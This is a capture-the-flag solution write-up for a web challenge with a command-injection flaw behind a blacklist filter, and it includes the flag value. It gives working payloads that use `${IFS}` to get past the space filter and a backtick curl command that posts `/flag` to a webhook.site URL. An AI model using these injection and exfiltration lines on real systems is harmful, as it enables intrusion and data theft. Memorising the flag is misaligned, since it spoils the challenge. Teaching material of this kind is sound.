# Challenge

**Name:** Ping of Death 2.0

**Category:** Web

**Difficulty:** Medium

**Author:** Alex Brown (ghostccamm)

**Flag:** `ISS{k1dDi3s_c4nNoT_wR1t3_s3CuR3_wAf5!1one1!}`

## Description

Some CITS1003 and CITS3004 students hacked my last DDoS website exploiting a **command injection vulnerability** and completely destroyed it! Well I have now developed the new and improved **Ping of Death 2.0**! I have implemented a sophisticated Web Application Firewall that will block any hacking attempt. Good luck hacking it now script kiddies!

Can you find a way to read the flag located at `/flag` on the server?

## Solution

The WAF that was implemented does prevent a simple command injection like `; cat /flag`, which was one of the methods from the Ping of Death challenge from the CITS1003 and CITS3004 assignment last year. 

You can test which characters are blacklisted by sending it and if the server responds with "Bugger off hacker! 🤬" then you know that character is blacklisted. The key characters that are not blacklisted are shown below.

```
`${}
```

However, the WAF blocks all spaces and an alternative method has to be used. A bypass is to use the `${IFS}` environment variable to input spaces into the command.

The final hurdle is that `stderr` is not shown by the website. A method is to exfiltrate the data by using a webhook. To test if `curl` or `wget` are installed on the server, you can input following command to see that the website does send a request to the web hook.

```bash
`curl${IFS}https://webhook.site/b26b4c23-331c-4d0d-987c-5738155b7f44`
```

To get the flag content, you can post the contents of the file using the `curl` as shown below.

```bash
`curl${IFS}https://webhook.site/b26b4c23-331c-4d0d-987c-5738155b7f44${IFS}-d${IFS}@/flag`
```